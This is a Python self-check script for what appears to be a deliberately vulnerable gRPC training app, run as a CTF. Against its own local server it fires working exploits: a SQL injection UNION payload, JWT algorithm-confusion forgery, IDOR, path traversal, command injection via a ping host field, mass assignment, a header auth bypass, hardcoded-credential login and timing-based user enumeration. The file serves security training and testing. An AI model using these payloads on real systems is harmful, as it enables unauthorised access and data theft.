#!/usr/bin/env python3
"""
DVGRPC self-check
==================
Runs a lightweight probe against a running server and verifies that every
intentional vulnerability is still exploitable.  Also updates the local
scoreboard file with the results — making this the world's laziest CTF
solver.

  python scripts/selfcheck.py
  python scripts/selfcheck.py --host localhost:50051
  python scripts/selfcheck.py --update-scoreboard

Exits 0 iff every challenge proves exploitable.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))


# ----------------------------------------------------------------------
# Helpers — coloured PASS/FAIL row
# ----------------------------------------------------------------------
def _c(code: str, s: str) -> str:
    return f"\033[{code}m{s}\033[0m" if sys.stdout.isatty() else s

GREEN = lambda s: _c("32", s)
RED   = lambda s: _c("31", s)
DIM   = lambda s: _c("2",  s)
BOLD  = lambda s: _c("1",  s)


def row(name: str, ok: bool, detail: str = "") -> None:
    tag = GREEN("  PASS  ") if ok else RED("  FAIL  ")
    print(f"{tag} {name:<40} {DIM(detail)}")


# ----------------------------------------------------------------------
# Individual checks
# ----------------------------------------------------------------------
def check_reflection(channel):
    from grpc_reflection.v1alpha.proto_reflection_descriptor_database import (
        ProtoReflectionDescriptorDatabase,
    )
    svcs = ProtoReflectionDescriptorDatabase(channel).get_services()
    return len(svcs) >= 7, f"{len(svcs)} services"


def check_unauth_admin(channel):
    from generated import admin_pb2, admin_pb2_grpc
    stub = admin_pb2_grpc.AdminServiceStub(channel)
    r = stub.GetFlag(admin_pb2.GetFlagRequest(challenge="unauthenticated_admin"))
    return r.flag.startswith("FLAG{"), r.flag


def check_sql_injection(channel):
    from generated import product_pb2, product_pb2_grpc
    stub = product_pb2_grpc.ProductServiceStub(channel)
    payload = "' UNION SELECT 0,flag,challenge,0,'' FROM flags --"
    r = stub.SearchProducts(product_pb2.SearchRequest(query=payload))
    joined = " ".join(p.name + p.description for p in r.products)
    return "FLAG{" in joined, f"dumped {len(r.products)} rows"


def check_jwt_confusion(channel):
    import jwt
    from generated import auth_pb2, auth_pb2_grpc, user_pb2, user_pb2_grpc
    auth = auth_pb2_grpc.AuthServiceStub(channel)
    pub = auth.GetPublicKey(auth_pb2.GetPublicKeyRequest()).public_key
    tok = jwt.encode({"user_id": 1, "username": "admin", "role": "admin"},
                     pub, algorithm="HS256")
    users = user_pb2_grpc.UserServiceStub(channel)
    r = users.GetProfile(user_pb2.GetProfileRequest(user_id=1),
                         metadata=(("authorization", f"Bearer {tok}"),))
    return r.username == "admin", "forged token accepted"


def check_idor(channel):
    from generated import auth_pb2, auth_pb2_grpc, user_pb2, user_pb2_grpc
    auth = auth_pb2_grpc.AuthServiceStub(channel)
    tok = auth.Login(auth_pb2.LoginRequest(username="alice", password="alice123")).token
    users = user_pb2_grpc.UserServiceStub(channel)
    r = users.GetProfile(user_pb2.GetProfileRequest(user_id=1),
                         metadata=(("authorization", f"Bearer {tok}"),))
    return r.username == "admin", "alice read admin profile"


def check_path_traversal(channel):
    from generated import auth_pb2, auth_pb2_grpc, file_pb2, file_pb2_grpc
    auth = auth_pb2_grpc.AuthServiceStub(channel)
    tok = auth.Login(auth_pb2.LoginRequest(username="alice", password="alice123")).token
    files = file_pb2_grpc.FileServiceStub(channel)
    r = files.ReadFile(file_pb2.ReadFileRequest(filename="../secret/path_flag.txt"),
                       metadata=(("authorization", f"Bearer {tok}"),))
    return "FLAG{" in r.content, "read ../secret/path_flag.txt"


def check_command_injection(channel):
    from generated import auth_pb2, auth_pb2_grpc, command_pb2, command_pb2_grpc
    auth = auth_pb2_grpc.AuthServiceStub(channel)
    tok = auth.Login(auth_pb2.LoginRequest(username="alice", password="alice123")).token
    cmd = command_pb2_grpc.CommandServiceStub(channel)
    payload = "127.0.0.1; cat /app/secret/cmd_flag.txt || cat ./.dvgrpc/secret/cmd_flag.txt"
    r = cmd.Ping(command_pb2.PingRequest(host=payload, count=1),
                 metadata=(("authorization", f"Bearer {tok}"),))
    return "FLAG{" in r.output, "cmd flag exfiltrated"


def check_mass_assignment(channel):
    from generated import auth_pb2, auth_pb2_grpc
    auth = auth_pb2_grpc.AuthServiceStub(channel)
    u = f"atk_{uuid.uuid4().hex[:6]}"
    auth.Register(auth_pb2.RegisterRequest(
        username=u, password="pw", email="e@e", role="admin"))
    r = auth.Login(auth_pb2.LoginRequest(username=u, password="pw"))
    return r.role == "admin", f"{u} is admin"


def check_metadata_bypass(channel):
    from generated import user_pb2, user_pb2_grpc
    users = user_pb2_grpc.UserServiceStub(channel)
    r = users.ListUsers(user_pb2.ListUsersRequest(),
                       metadata=(("x-internal-service", "dvgrpc-internal-v1"),))
    return len(r.users) > 0, f"{len(r.users)} users without token"


def check_hardcoded_creds(channel):
    from generated import auth_pb2, auth_pb2_grpc
    auth = auth_pb2_grpc.AuthServiceStub(channel)
    r = auth.Login(auth_pb2.LoginRequest(username="admin", password="admin123"))
    return r.success and r.role == "admin", "admin:admin123 works"


def check_timing_attack(channel):
    import statistics
    from generated import auth_pb2, auth_pb2_grpc
    auth = auth_pb2_grpc.AuthServiceStub(channel)
    samples = {"admin": [], "ghostghost": []}
    for _ in range(6):
        for name in samples:
            t0 = time.perf_counter()
            try:
                auth.Login(auth_pb2.LoginRequest(username=name, password="x"))
            except Exception:
                pass
            samples[name].append((time.perf_counter() - t0) * 1000)
    m_real    = statistics.median(samples["admin"])
    m_missing = statistics.median(samples["ghostghost"])
    gap = m_real - m_missing
    return gap > 20, f"real={m_real:.1f}ms missing={m_missing:.1f}ms Δ={gap:.1f}ms"


def check_int_overflow(channel):
    from generated import product_pb2, product_pb2_grpc
    stub = product_pb2_grpc.ProductServiceStub(channel)
    n_normal = stub.PaginatedSearch(
        product_pb2.PaginatedSearchRequest(query="", page=0, per_page=5)).total_returned
    all_rows = stub.PaginatedSearch(
        product_pb2.PaginatedSearchRequest(query="", page=0, per_page=-1))
    joined = " ".join(p.description for p in all_rows.products)
    return all_rows.total_returned > n_normal and "FLAG{" in joined, \
        f"{n_normal} → {all_rows.total_returned} rows"


def check_ecb(channel):
    from generated import crypto_pb2, crypto_pb2_grpc
    stub = crypto_pb2_grpc.CryptoServiceStub(channel)
    r = stub.Encrypt(crypto_pb2.EncryptRequest(plaintext="A" * 32, algorithm="AES-ECB"))
    ct = bytes.fromhex(r.ciphertext_hex)
    return ct[:16] == ct[16:32], "first two blocks identical"


CHECKS = [
    ("reflection",            check_reflection),
    ("unauthenticated_admin", check_unauth_admin),
    ("sql_injection",         check_sql_injection),
    ("jwt_confusion",         check_jwt_confusion),
    ("idor",                  check_idor),
    ("path_traversal",        check_path_traversal),
    ("command_injection",     check_command_injection),
    ("mass_assignment",       check_mass_assignment),
    ("metadata_bypass",       check_metadata_bypass),
    ("hardcoded_creds",       check_hardcoded_creds),
    ("timing_attack",         check_timing_attack),
    ("integer_overflow",      check_int_overflow),
    ("crypto_ecb",            check_ecb),
]


# ----------------------------------------------------------------------
def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--host",              default=os.getenv("DVGRPC_HOST_PORT", "localhost:50051"))
    p.add_argument("--update-scoreboard", action="store_true")
    p.add_argument("--json",              action="store_true")
    args = p.parse_args()

    import grpc
    channel = grpc.insecure_channel(args.host)
    try:
        grpc.channel_ready_future(channel).result(timeout=5)
    except grpc.FutureTimeoutError:
        print(RED(f"  Cannot reach {args.host} — is the server running?"))
        return 2

    results: dict[str, dict] = {}
    pass_count = 0
    print(BOLD(f"\n  DVGRPC self-check — {args.host}\n"))
    for key, fn in CHECKS:
        try:
            ok, detail = fn(channel)
        except Exception as exc:  # pragma: no cover
            ok, detail = False, f"raised {type(exc).__name__}: {exc}"
        results[key] = {"ok": bool(ok), "detail": detail}
        row(key, ok, detail)
        if ok:
            pass_count += 1

    print()
    print(BOLD(f"  {pass_count}/{len(CHECKS)} challenges verified."))

    if args.update_scoreboard:
        path = Path(os.getenv("DVGRPC_PROGRESS_FILE",
                              str(Path.home() / ".dvgrpc-progress.json")))
        data = {"solved": {}, "created": datetime.utcnow().isoformat()}
        if path.exists():
            try:
                data = json.loads(path.read_text())
            except json.JSONDecodeError:
                pass
        for key, r in results.items():
            if r["ok"]:
                data.setdefault("solved", {})[key] = datetime.utcnow().isoformat()
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(data, indent=2, sort_keys=True))
        print(DIM(f"  scoreboard updated → {path}"))

    if args.json:
        print(json.dumps(results, indent=2))

    return 0 if pass_count == len(CHECKS) else 1


if __name__ == "__main__":
    sys.exit(main())
